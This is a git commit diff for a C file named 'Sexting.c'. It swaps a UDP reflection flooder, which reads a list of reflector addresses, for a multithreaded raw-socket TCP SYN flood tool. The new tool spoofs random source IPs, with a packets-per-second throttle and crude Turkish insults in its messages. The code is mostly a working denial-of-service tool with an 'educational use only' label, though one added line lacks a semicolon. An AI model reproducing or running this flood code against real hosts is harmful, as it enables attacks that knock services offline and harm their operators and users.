c1fdb97f4eb2bfc600adcf8693abdadfc9287383
Dennis1337x <113421270+Dennis1337x@users.noreply.github.com>
2024-01-22 05:40:27 +0300

    Update Sexting.c

--- Sexting.c
+++ Sexting.c
@@ -1,41 +1,48 @@
-#include <time.h>
-#include <pthread.h>
+/*
+ * All credits go to LiteSpeed
+ * For educational use only.
+ *[Instructions]: Save as essyn.c | compile with : gcc essyn.c -pthread -o essyn |
+ * This is released under the GNU GPL License v3.0, and is not allowed to be used for commercial products
+ */
 #include <unistd.h>
-#include <stdio.h>
-#include <stdlib.h>
-#include <string.h>
+#include <time.h>
+#include <sys/types.h>
 #include <sys/socket.h>
+#include <sys/ioctl.h>
+#include <string.h>
+#include <stdlib.h>
+#include <stdio.h>
+#include <pthread.h>
+#include <netinet/tcp.h>
 #include <netinet/ip.h>
-#include <netinet/udp.h>
+#include <netinet/in.h>
+#include <netinet/if_ether.h>
+#include <netdb.h>
+#include <net/if.h>
 #include <arpa/inet.h>
-#define MAX_PACKET_SIZE 8192
+ 
+#define MAX_PACKET_SIZE 4096
 #define PHI 0x9e3779b9
-static uint32_t Q[4096], c = 362436;
-struct list
-{
-        struct sockaddr_in data;
-        struct list *next;
-        struct list *prev;
-};
-struct list *head;
-struct thread_data{ int thread_id; struct list *list_node; struct sockaddr_in sin; };
-void init_rand(uint32_t x)
+ 
+static unsigned long int Q[4096], c = 362436;
+static unsigned int floodport;
+volatile int limiter;
+volatile unsigned int pps;
+volatile unsigned int sleeptime = 100;
+ 
+void init_rand(unsigned long int x)
 {
         int i;
         Q[0] = x;
         Q[1] = x + PHI;
         Q[2] = x + PHI + PHI;
-        for (i = 3; i < 4096; i++)
-        {
-                Q[i] = Q[i - 3] ^ Q[i - 2] ^ PHI ^ i;
-        }
+        for (i = 3; i < 4096; i++){ Q[i] = Q[i - 3] ^ Q[i - 2] ^ PHI ^ i; }
 }
-
-uint32_t rand_cmwc(void)
+unsigned long int rand_cmwc(void)
 {
-        uint64_t t, a = 18782LL;
-        static uint32_t i = 4095;
-        uint32_t x, r = 0xfffffffe;
+        unsigned long long int t, a = 18782LL;
+        static unsigned long int i = 4095;
+        unsigned long int x, r = 0xfffffffe;
         i = (i + 1) & 4095;
         t = a * Q[i] + c;
         c = (t >> 32);
@@ -46,142 +53,170 @@ uint32_t rand_cmwc(void)
         }
         return (Q[i] = r - x);
 }
-
-/* function for header checksums */
-unsigned short csum (unsigned short *buf, int nwords)
+unsigned short csum (unsigned short *buf, int count)
 {
-        unsigned long sum;
-        for (sum = 0; nwords > 0; nwords--)
-        sum += *buf++;
-        sum = (sum >> 16) + (sum & 0xffff);
-        sum += (sum >> 16);
+        register unsigned long sum = 0;
+        while( count > 1 ) { sum += *buf++; count -= 2; }
+        if(count > 0) { sum += *(unsigned char *)buf; }
+        while (sum>>16) { sum = (sum & 0xffff) + (sum >> 16); }
         return (unsigned short)(~sum);
 }
-
+ 
+unsigned short tcpcsum(struct iphdr *iph, struct tcphdr *tcph) {
+ 
+        struct tcp_pseudo
+        {
+                unsigned long src_addr;
+                unsigned long dst_addr;
+                unsigned char zero;
+                unsigned char proto;
+                unsigned short length;
+        } pseudohead;
+        unsigned short total_len = iph->tot_len;
+        pseudohead.src_addr=iph->saddr;
+        pseudohead.dst_addr=iph->daddr;
+        pseudohead.zero=0;
+        pseudohead.proto=IPPROTO_TCP;
+        pseudohead.length=htons(sizeof(struct tcphdr));
+        int totaltcp_len = sizeof(struct tcp_pseudo) + sizeof(struct tcphdr);
+        unsigned short *tcp = malloc(totaltcp_len);
+        memcpy((unsigned char *)tcp,&pseudohead,sizeof(struct tcp_pseudo));
+        memcpy((unsigned char *)tcp+sizeof(struct tcp_pseudo),(unsigned char *)tcph,sizeof(struct tcphdr));
+        unsigned short output = csum(tcp,totaltcp_len);
+        free(tcp);
+        return output;
+}
+ 
 void setup_ip_header(struct iphdr *iph)
 {
         iph->ihl = 5;
         iph->version = 4;
         iph->tos = 0;
-        iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + 4;
+        iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr);
         iph->id = htonl(54321);
         iph->frag_off = 0;
         iph->ttl = MAXTTL;
-        iph->protocol = IPPROTO_UDP;
+        iph->protocol = 6;
         iph->check = 0;
         iph->saddr = inet_addr("192.168.3.100");
 }
-
-void setup_udp_header(struct udphdr *udph)
+ 
+void setup_tcp_header(struct tcphdr *tcph)
 {
-        udph->source = htons(5678);
-        udph->dest = htons(19);
-        udph->check = 0;
-        strcpy((void *)udph + sizeof(struct udphdr), "h");
-        udph->len=htons(sizeof(struct udphdr) + 3);
+        tcph->source = htons(5678);
+        tcph->seq = rand();
+        tcph->ack_seq = 0;
+        tcph->res2 = 0;
+        tcph->doff = 5;
+        tcph->syn = 1;
+        tcph->window = htonl(65535);
+        tcph->check = 0;
+        tcph->urg_ptr = 0;
 }
-
+ 
 void *flood(void *par1)
 {
-        struct thread_data *td = (struct thread_data *)par1;
+        char *td = (char *)par1;
         char datagram[MAX_PACKET_SIZE];
         struct iphdr *iph = (struct iphdr *)datagram;
-        struct udphdr *udph = (/*u_int8_t*/void *)iph + sizeof(struct iphdr);
-        struct sockaddr_in sin = td->sin;
-        struct  list *list_node = td->list_node;
+        struct tcphdr *tcph = (void *)iph + sizeof(struct iphdr);
+       
+        struct sockaddr_in sin;
+        sin.sin_family = AF_INET;
+        sin.sin_port = htons(floodport);
+        sin.sin_addr.s_addr = inet_addr(td);
+ 
         int s = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
         if(s < 0){
-                fprintf(stderr, "Could not open raw socket.\n");
+                fprintf(stderr, "Acamadik amq.\n");
                 exit(-1);
         }
-        init_rand(time(NULL));
         memset(datagram, 0, MAX_PACKET_SIZE);
         setup_ip_header(iph);
-        setup_udp_header(udph);
-        udph->source = sin.sin_port;
-        iph->saddr = sin.sin_addr.s_addr;
-        iph->daddr = list_node->data.sin_addr.s_addr;
-        iph->check = csum ((unsigned short *) datagram, iph->tot_len >> 1);
+        setup_tcp_header(tcph);
+ 
+        tcph->dest = htons(floodport);
+ 
+        iph->daddr = sin.sin_addr.s_addr;
+        iph->check = csum ((unsigned short *) datagram, iph->tot_len);
+ 
         int tmp = 1;
         const int *val = &tmp;
         if(setsockopt(s, IPPROTO_IP, IP_HDRINCL, val, sizeof (tmp)) < 0){
                 fprintf(stderr, "Error: setsockopt() - Cannot set HDRINCL!\n");
                 exit(-1);
         }
-        int i=0;
+ 
+        init_rand(time(NULL));
+        register unsigned int i;
+        i = 0;
         while(1){
-                sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &list_node->data, sizeof(list_node->data));
-                list_node = list_node->next;
-                iph->daddr = list_node->data.sin_addr.s_addr;
-                iph->check = csum ((unsigned short *) datagram, iph->tot_len >> 1);
-                if(i==5)
+                sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin));
+ 
+                iph->saddr = (rand_cmwc() >> 24 & 0xFF) << 24 | (rand_cmwc() >> 16 & 0xFF) << 16 | (rand_cmwc() >> 8 & 0xFF) << 8 | (rand_cmwc() & 0xFF);
+                iph->id = htonl(rand_cmwc() & 0xFFFFFFFF);
+                iph->check = csum ((unsigned short *) datagram, iph->tot_len);
+                tcph->seq = rand_cmwc() & 0xFFFF;
+                tcph->source = htons(rand_cmwc() & 0xFFFF);
+                tcph->check = 0;
+                tcph->check = tcpcsum(iph, tcph);
+               
+                pps++;
+                if(i >= limiter)
                 {
-                        usleep(0);
-                        i=0;
+                        i = 0;
+                        usleep(sleeptime);
+                        fprintf(stdout, "diwno baba sikis zamani")
                 }
                 i++;
         }
 }
 int main(int argc, char *argv[ ])
 {
-        if(argc < 4){
-                fprintf(stderr, "Invalid parameters!\n");
-                fprintf(stdout, "Usage: %s <target IP> <target port> <reflection file> <throttle> <time (optional)>\n", argv[0]);
+        if(argc < 6){
+                fprintf(stderr, "Yanlis Kullanim OC!\n");
+                fprintf(stdout, "Aha Boyle Kullancan: %s ipyigirkrdsm <porno- pardon port buraya> <saniyelik vurus hizi> -1 vuracagi sure\n", argv[0]);
                 exit(-1);
         }
-        int i = 0;
-        head = NULL;
-        fprintf(stdout, "Setting up Sockets...\n");
-        int max_len = 128;
-        char *buffer = (char *) malloc(max_len);
-        buffer = memset(buffer, 0x00, max_len);
-        int num_threads = atoi(argv[4]);
-        FILE *list_fd = fopen(argv[3],  "r");
-        while (fgets(buffer, max_len, list_fd) != NULL) {
-                if ((buffer[strlen(buffer) - 1] == '\n') ||
-                                (buffer[strlen(buffer) - 1] == '\r')) {
-                        buffer[strlen(buffer) - 1] = 0x00;
-                        if(head == NULL)
-                        {
-                                head = (struct list *)malloc(sizeof(struct list));
-                                bzero(&head->data, sizeof(head->data));
-                                head->data.sin_addr.s_addr=inet_addr(buffer);
-                                head->next = head;
-                                head->prev = head;
-                        } else {
-                                struct list *new_node = (struct list *)malloc(sizeof(struct list));
-                                memset(new_node, 0x00, sizeof(struct list));
-                                new_node->data.sin_addr.s_addr=inet_addr(buffer);
-                                new_node->prev = head;
-                                new_node->next = head->next;
-                                head->next = new_node;
-                        }
-                        i++;
-                } else {
-                        continue;
-                }
-        }
-        struct list *current = head->next;
+ 
+        fprintf(stdout, "Kuruyom amk salagi bekle\n");
+ 
+        int num_threads = atoi(argv[3]);
+        floodport = atoi(argv[2]);
+        int maxpps = atoi(argv[4]);
+        limiter = 0;
+        pps = 0;
         pthread_t thread[num_threads];
-        struct sockaddr_in sin;
-        sin.sin_family = AF_INET;
-        sin.sin_port = htons(atoi(argv[2]));
-        sin.sin_addr.s_addr = inet_addr(argv[1]);
-        struct thread_data td[num_threads];
+       
+        int multiplier = 20;
+ 
+        int i;
         for(i = 0;i<num_threads;i++){
-                td[i].thread_id = i;
-                td[i].sin= sin;
-                td[i].list_node = current;
-                pthread_create( &thread[i], NULL, &flood, (void *) &td[i]);
+                pthread_create( &thread[i], NULL, &flood, (void *)argv[1]);
         }
-        fprintf(stdout, "Starting Flood...\n");
-        if(argc > 5)
+        fprintf(stdout, "basliyom amcik\n");
+        for(i = 0;i<(atoi(argv[5])*multiplier);i++)
         {
-                sleep(atoi(argv[5]));
-        } else {
-                while(1){
-                        sleep(1);
+                usleep((100/multiplier)*100);
+                if((pps*multiplier) > maxpps)
+                {
+                        if(1 > limiter)
+                        {
+                                sleeptime+=100;
+                        } else {
+                                limiter--;
+                        }
+                } else {
+                        limiter++;
+                        if(sleeptime > 25)
+                        {
+                                sleeptime-=25;
+                        } else {
+                                sleeptime = 0;
+                        }
                 }
+                pps = 0;
         }
+ 
         return 0;
 }
